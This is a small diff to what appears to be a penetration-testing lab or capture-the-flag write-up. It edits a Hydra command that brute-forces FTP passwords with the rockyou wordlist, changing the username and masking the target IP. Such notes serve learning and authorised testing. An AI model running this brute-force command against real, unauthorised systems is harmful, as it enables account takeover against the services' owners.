@@ -56,7 +56,7 @@ Information we have gathered:
  - fast
  - Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, etc.
 
-``hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp``
+``hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.x.x ftp``
 
 ![image](https://user-images.githubusercontent.com/80155116/111871648-245a8300-89f0-11eb-8ed0-3f151c7a1234.png)
 
